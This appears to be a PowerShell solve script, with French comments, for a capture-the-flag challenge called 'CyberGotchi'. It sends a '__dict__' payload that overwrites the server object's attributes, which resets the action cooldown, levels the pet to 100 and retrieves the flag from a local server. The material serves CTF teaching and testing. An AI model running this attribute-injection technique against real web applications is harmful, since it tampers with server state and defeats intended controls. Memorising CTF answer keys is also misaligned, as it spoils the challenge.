<#
CyberGotchi - Solution alternative : contournement du cooldown via __dict__
Utilisation :
  .\solve2.ps1 -TestOnly   # Vérifie 2 actions successives sans attendre
  .\solve2.ps1             # Progresse jusqu'au niveau 100 puis récupère le flag
  .\solve2.ps1 -BaseUrl 'http://localhost:5000'
Réservé au writeup / aux organisateurs.
#>
param(
    [string]$BaseUrl = 'http://localhost:5000',
    [switch]$TestOnly
)

$ErrorActionPreference = 'Stop'
$BaseUrl = $BaseUrl.TrimEnd('/')

try {
    $pet = Invoke-RestMethod -Uri "$BaseUrl/api/pet" -SessionVariable session
    $cookie = $session.Cookies.GetCookies($BaseUrl)['bloop_id']
    if (-not $cookie -or -not $cookie.Value) {
        throw 'Cookie bloop_id introuvable.'
    }
    $petId = $cookie.Value
    Write-Host "[*] BLOOP : niveau $($pet.stage), $($pet.progress) XP, cooldown $($pet.cooldown_remaining)s"

    $targetActions = if ($TestOnly) { 2 } else { 990 }

    for ($i = 1; $i -le $targetActions; $i++) {
        # L'état public contient 'stage' plutôt que 'level'.
        $currentXp = ([int]$pet.stage - 1) * 100 + [int]$pet.progress
        $nextXp = $currentXp + 10
        $nextLevel = [Math]::Min(100, 1 + [int][Math]::Floor($nextXp / 100))

        # Remplacement de __dict__ : on conserve une instance cohérente,
        # mais on remet last_action à 0 pour neutraliser le cooldown.
        $payload = @{
            action = 'feed'
            '__dict__' = @{
                pet_id = $petId
                name = 'BLOOP'
                xp = $nextXp
                level = $nextLevel
                last_action = 0
            }
        } | ConvertTo-Json -Depth 5

        $response = Invoke-RestMethod -Uri "$BaseUrl/api/action" `
            -Method POST -WebSession $session `
            -ContentType 'application/json' -Body $payload
        $pet = $response.pet

        if ($TestOnly -or $i % 50 -eq 0 -or [int]$pet.stage -ge 100) {
            Write-Host "[+] Action $i : niveau $($pet.stage), $($pet.progress)/100 XP, cooldown $($pet.cooldown_remaining)s"
        }
        if ([int]$pet.stage -ge 100) { break }
    }

    if ($TestOnly) {
        Write-Host '[+] Si les 2 actions ont réussi et le cooldown reste à 0, le contournement est confirmé.'
    } elseif ([int]$pet.stage -ge 100) {
        $reward = Invoke-RestMethod -Uri "$BaseUrl/api/reward" -WebSession $session
        Write-Host "[+] FLAG : $($reward.flag)"
    } else {
        Write-Host '[-] Le niveau 100 n’a pas été atteint.'
    }
} catch {
    Write-Error "Échec : $($_.Exception.Message)"
    exit 1
}